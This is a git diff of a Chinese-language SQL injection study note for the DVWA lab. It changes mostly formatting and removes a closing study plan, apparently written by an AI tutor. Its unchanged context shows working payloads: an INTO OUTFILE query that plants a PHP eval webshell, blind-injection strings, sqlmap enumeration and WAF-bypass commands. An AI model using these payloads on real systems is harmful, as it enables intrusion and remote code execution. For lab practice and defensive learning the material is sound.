@@ -1,7 +1,7 @@
 ---
 title: SQL注入
 date: 2026-07-15
-tags: []
+tags: [sql注入，DVWA]
 ---
 
 # SQL 注入完整渗透测试流程
@@ -293,11 +293,13 @@ gordonb → abc123
 ### 4.2 写入 Webshell（Into Outfile）
 
 **前提条件**：
+
 - 有 `FILE` 权限
 - 知道 Web 根目录路径
 - `secure_file_priv` 允许写入
 
 **Payload（写入一句话木马）**：
+
 ```
 -1' union select null,'<?php @eval($_POST["cmd"]); ?>' into outfile 'c:/phpstudy/www/dvwa/shell.php'-- -
 ```
@@ -322,6 +324,7 @@ http://127.0.0.1/dvwa/shell.php
 **绕过方法**：利用数字型注入点，或使用宽字节注入
 
 **DVWA Medium 特点**：下拉框提交，抓包改参数
+
 ```
 Burp 抓包 → 改 id=1 为：
 id=1 union select null,database()
@@ -355,13 +358,15 @@ id=1 union select null,database()
 ```
 
 **逐字符猜解数据库名**：
-```
+
+```sql
 1' and substr(database(),1,1)='d'-- -   → 成功
 1' and substr(database(),2,1)='v'-- -   → 成功
 1' and substr(database(),3,1)='w'-- -   → 成功
 ```
 
 **自动化脚本**（Python）：
+
 ```python
 import requests
 
@@ -390,7 +395,7 @@ print(f"[*] Database: {db_name}")
 **场景**：页面无论输入什么都返回相同内容
 
 **利用 `SLEEP()` 函数**：
-```
+```sql
 1' and if(length(database())=5, sleep(3), 0)-- -
 ```
 
@@ -430,6 +435,7 @@ sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --coo
 ```
 
 **枚举 users 表的列**：
+
 ```bash
 sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your_session; security=low" -D dvwa1 -T users --columns
 ```
@@ -472,6 +478,7 @@ sqlmap -u "http://example.com/page?id=1" --technique=BEUST
 - T: Time-based blind（时间盲注）
 
 **绕过 WAF**：
+
 ```bash
 sqlmap -u "http://example.com/page?id=1" --tamper=space2comment --random-agent
 ```
@@ -723,17 +730,3 @@ $result = $stmt->get_result();
 - [ ] 能写出规范的渗透测试报告
 - [ ] 理解预编译语句的防御原理
 
----
-
-**今天的学习计划**：
-1. ✅ 完成 DVWA Low 级别手工注入（上午 2-3 小时）
-2. ⬜ 挑战 Medium 和 High 级别（下午 2 小时）
-3. ⬜ 学习布尔盲注和时间盲注（下午 1 小时）
-4. ⬜ 使用 sqlmap 自动化测试（晚上 1 小时）
-5. ⬜ 写一份完整的渗透测试报告（晚上 1 小时）
-
-**预计总时长**：6-8 小时
-
----
-
-**下一步**：打开 DVWA → SQL Injection (Low) → 告诉我你准备好了，我们从 2.1 判断列数开始实操。
